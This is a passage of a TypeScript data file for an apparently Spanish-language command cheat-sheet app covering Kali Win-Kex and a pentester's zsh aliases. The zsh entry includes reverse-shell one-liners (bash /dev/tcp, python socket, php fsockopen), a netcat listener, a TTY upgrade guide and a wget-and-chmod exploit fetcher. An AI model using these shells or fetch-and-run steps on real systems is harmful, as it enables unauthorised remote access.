    "updated_at": "2026-03-05T03:16:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-81ad-a8ae-edc342093c45",
    "title": "Win-Kex",
    "command": "kex --win -s",
    "description": "Entorno de escritorio completo para Kali Linux en WSL2, permite usar apps gráficas de Kali dentro de Windows.",
    "category": "Linux",
    "tags": [],
    "examples": [
      "# Instalar\nsudo apt install kali-win-kex\n\n# Iniciar en modo ventana\nkex --win -s\n\n# Iniciar en modo pantalla completa (seamless)\nkex --sl -s\n\n# Iniciar en modo ESM (Enhanced Session Mode, más rápido)\nkex --esm --ip -s",
      "kex [modo] [opciones]",
      "sudo apt install firefox-esr -y\nfirefox  # abre ventana nativa si WSLg está activo",
      "kex --win -s\n# Conectarse con VNC viewer a localhost:5901\n# Password por defecto: kex",
      "kex stop"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# Instalar\nsudo apt install kali-win-kex\n\n# Iniciar en modo ventana\nkex --win -s\n\n# Iniciar en modo pantalla completa (seamless)\nkex --sl -s\n\n# Iniciar en modo ESM (Enhanced Session Mode, más rápido)\nkex --esm --ip -s",
    "parameters": [
      {
        "param": "--win",
        "description": "Kali en ventana separada (VNC)",
        "example": "| Seamless"
      }
    ],
    "output": "",
    "notes": "- En Windows 11 actualizado, WSLg permite abrir apps gráficas individuales sin necesidad de Win-Kex\n- Win-Kex es necesario para escritorio completo o si WSLg no está disponible (Windows 10)\n- Para web pentesting (Burp, Firefox, SQLMap) suele bastar con WSLg + apps individuales\n- Para configurar FoxyProxy + Burp: instalar Firefox ESR y apuntar proxy a `127.0.0.1:8080`",
    "references": [
      "Win-Kex Kali Docs",
      "WSLg GitHub"
    ],
    "created_at": "2026-03-05T00:59:00.000Z",
    "updated_at": "2026-03-05T03:14:00.000Z"
  },
  {
    "id": "2d7ec7e7-4fc0-8054-a7ea-de3d27892a26",
    "title": "zsh",
    "command": "sudo nano ~/.zshrc ",
    "description": "Cheas para configurar zshrc",
    "category": "zshrc",
    "tags": [],
    "examples": [
      "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
      "bat archivo.py        # Ver archivo con colores\nbat -l man archivo    # Aplicar formato de man\nalias bat='batcat'    # Ya está configurado en tu zshrc",
      "Ctrl+T                # Buscar archivos en directorio actual\nCtrl+R                # Buscar en historial\nAlt+C                 # Navegar directorios\n\n# Completar con FZF en cualquier comando (usa **)\ncd **<TAB>            # Buscar directorios para cd\nls **<TAB>            # Buscar archivos para listar\ncat **<TAB>           # Buscar archivo para ver contenido\ngrep patrón **<TAB>   # Buscar archivos para grep",
      "alias ls='lsd'        # ls con colores y iconos\nll                    # ls -l (detalles)\nla                    # ls -A (ocultos)\nl                     # ls -CF (compact)",
      "..                    # cd ..\n...                   # cd ../..\n....                  # cd ../../..\n.....                 # cd ../../../..",
      "alias history=\"history 0\"    # Ver todo el historial",
      "du                    # du -h (tamaño carpetas)\ndf                    # df -h (espacios montar)",
      "export EDITOR=nvim    # O vim/nano\nexport VISUAL=$EDITOR",
      "myip                  # Todas las IPs (local + VPN)\nmyip4                 # Solo IPv4 (sin loopback)\nmyip6                 # Solo IPv6\nvpnip                 # IP del tun0 (VPN)",
      "www                   # Python HTTP.server en puerto 80\nwww8                  # Python HTTP.server en puerto 8000\nphpserver             # PHP server en 0.0.0.0:8000",
      "ports                 # netstat -tulanp (puertos escuchando)\nlistening             # lsof -i -P (conexiones activas)\nportscan              # nmap -sS -sV -O",
      "sgrep \"pattern\"       # grep -R -n -H -C 5 (recursivo con contexto)",
      "cpv                   # rsync -ah --info=progress2 (Copia visible)",
      "extract archivo.tar.gz     # Extrae automáticamente (.tar.bz2, .zip, .rar, .7z, etc.)",
      "gs                    # git status\nga                    # git add\ngc \"mensaje\"          # git commit -m \"mensaje\"\ngp                    # git push\ngl                    # git log --oneline --graph --decorate",
      "mkcd nombre           # mkdir -p nombre && cd nombre",
      "kp nombre_proceso     # Mata proceso por nombre (sudo kill -9)",
      "hs \"búsqueda\"         # history | grep \"búsqueda\"",
      "cp_p archivo1 archivo2   # Copia visual con barra de progreso",
      "genpass               # 16 caracteres aleatorios (default)\ngenpass 32            # 32 caracteres aleatorios",
      "listports             # sudo netstat -tulanp | grep LISTEN",
      "ff \"nombre\"           # find . -type f -iname \"*nombre*\"\nfd \"nombre\"           # find . -type d -iname \"*nombre*\"",
      "bk archivo.txt        # archivo.txt.bak.YYYYMMDD_HHMMSS",
      "path                  # Muestra cada ruta en una línea",
      "transfer archivo      # Sube y devuelve URL pública temporal",
      "extract archivo       # Detecta formato y extrae (.tar, .zip, .7z, .rar, .gz, etc.)",
      "nmap-quick <target>   # nmap -sC -sV -oN quick.txt <target>\nnmap-full <target>    # nmap -p- -sC -sV -oN full.txt <target>\nnmap-udp <target>     # sudo nmap -sU -sC -sV -oN udp.txt <target>\nnmap-vuln <target>    # nmap --script vuln -oN vuln.txt <target>",
      "ctfscan 10.10.10.1    # nmap -sC -sV -oA nmap/10.10.10.1 10.10.10.1\n                      # Crea carpeta nmap/ y guarda 3 formatos (.nmap, .gnmap, .xml)",
      "listen                # nc -lvnp 443 (default)\nlisten 4444           # nc -lvnp 4444\n                      # Usa rlwrap para historial + edición",
      "nc 192.168.1.1 4444   # netcat directo (con rlwrap)\nalias nc='rlwrap nc'",
      "ttyup                 # Muestra guía paso a paso\n                      # 1. python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n                      # 2. Ctrl+Z\n                      # 3. stty raw -echo; fg\n                      # 4. export TERM=xterm\n                      # 5. stty rows 38 columns 116",
      "echo \"texto\" | clip   # Copiar a clipboard\npaste                 # Pegar desde clipboard",
      "getexploit https://github.com/...script.py\n                      # wget URL -O nombre && chmod +x nombre",
      "update                # sudo apt update && full-upgrade -y && autoremove -y",
      "HISTFILE=~/.zsh_history    # 50,000 líneas guardadas\nHISTSIZE=50000\nSAVEHIST=50000\n\n# Opciones:\n# - hist_expire_dups_first: Borra duplicados primero\n# - hist_ignore_dups: No guarda comandos iguales consecutivos\n# - hist_ignore_space: Ignora comandos que comienzan con espacio\n# - extended_history: Guarda timestamp",
      "export MANPAGER=\"sh -c 'col -bx | bat -l man -p'\"    # man con colores\nexport FZF_DEFAULT_OPTS=\"--height 40% --layout=reverse --border\"\nexport TERM=xterm-256color\nexport EDITOR=nvim",
      "# zsh completion automático\n# zstyle options para colors, matcher-list, etc.",
      "Ctrl+Space  # Acepta sugerencia",
      "cd /path1      # pushd automático\ncd /path2\npopd           # Vuelve a /path1",
      "ls=lsd         # Expande a ls --color=auto\nnmap=nmap -sC -sV    # Expande automáticamente",
      "setopt correct        # ❌ Puede auto-corregir comandos peligrosos",
      "setopt noclobber      # ✅ Previene sobrescribir archivos con >\nsetopt rm_star_wait   # ✅ Espera 10 segundos antes de rm *\nsetopt hist_ignore_space   # ✅ Ignora comandos con espacio prefix",
      "Alternar con:",
      "---\n\n\n## 📝 Crear tus propios aliases/funciones\n\n\n### Alias simple",
      "### Función personalizada",
      "---\n\n\n## 🚀 Rápido - Comandos más usados"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
    "parameters": [
      {
        "param": "Ctrl+A",
        "description": "Inicio de línea",
        "example": "| `Ctrl+E`"
      },
      {
        "param": "Ctrl+<-",
        "description": "Palabra anterior",
        "example": "| `Ctrl+->`"
      },
      {
        "param": "Ctrl+U",
        "description": "Borrar línea (backward-kill-line)",
        "example": "| `Ctrl+Supr`"
      },
      {
        "param": "Delete",
        "description": "Borrar carácter",
        "example": "### Historial"
      },
      {
        "param": "↑",
        "description": "Comando anterior (busca en historial)",
        "example": "| `↓`"
      },
      {
        "param": "Ctrl+R",
        "description": "Búsqueda incremental en historial",
        "example": "| `Ctrl+S`"
      },
      {
        "param": "Shift+Tab",
        "description": "Deshacer última acción (undo)",
        "example": "| `Ctrl+P`"
      },
      {
        "param": "Ctrl+Space",
        "description": "Aceptar autosuggestion",
        "example": "### FZF"
      },
      {
        "param": "Ctrl+T",
        "description": "Buscar archivo",
        "example": "| `Ctrl+R`"
      },
      {
        "param": "Alt+C",
        "description": "Navegar directorios",
        "example": "| `Tab`"
      }
    ],
    "output": "revshell              # Detecta IP de tun0 y puerto 443 (default)\nrevshell 192.168.1.1  # IP custom, puerto 443\nrevshell 192.168.1.1 4444   # IP y puerto custom\n\n# Output: 3 opciones (bash, python3, php)\n# bash -i >& /dev/tcp/IP/PORT 0>&1\n# python3 -c 'import socket,subprocess,os;s=...'\n# php -r '$sock=fsockopen(\"IP\",PORT);...'",
    "notes": "",
    "references": [],
    "created_at": "2025-12-28T04:22:00.000Z",
    "updated_at": "2026-03-03T02:08:00.000Z"
  }
];

// Convertir categorías de strings a objetos para compatibilidad con componentes
export const categories = [
  { id: 'all', name: 'Todos los comandos', color: 'gray', count: commands.length },
  ...([...new Set(commands.map(cmd => cmd.category))].sort().map(category => ({
    id: category.toLowerCase().replace(/\s+/g, '-'),
    name: category,
    color: getCategoryColor(category),
    count: commands.filter(cmd => cmd.category === category).length
  })))
];

// Función para asignar colores a categorías
function getCategoryColor(category: string): string {
  const colorMap: { [key: string]: string } = {
    'dns': 'blue',
    'linux': 'green',
    'security': 'red',
    'network': 'indigo',
    'database': 'purple',
    'web': 'orange',
    'git': 'teal',
    'docker': 'cyan'
  };
  
  return colorMap[category.toLowerCase()] || 'gray';
}

export function getCommandById(id: string): Command | undefined {
  return commands.find(cmd => cmd.id === id);
}

export function getCommandsByCategory(category: string): Command[] {
  if (category === 'all') return commands;
  return commands.filter(cmd => cmd.category === category);
}

export function searchCommands(query: string): Command[] {
  const searchTerm = query.toLowerCase();
  return commands.filter(cmd => 
    cmd.title.toLowerCase().includes(searchTerm) ||
    cmd.command.toLowerCase().includes(searchTerm) ||
    cmd.description.toLowerCase().includes(searchTerm) ||
    cmd.tags.some(tag => tag.toLowerCase().includes(searchTerm))
  );
}
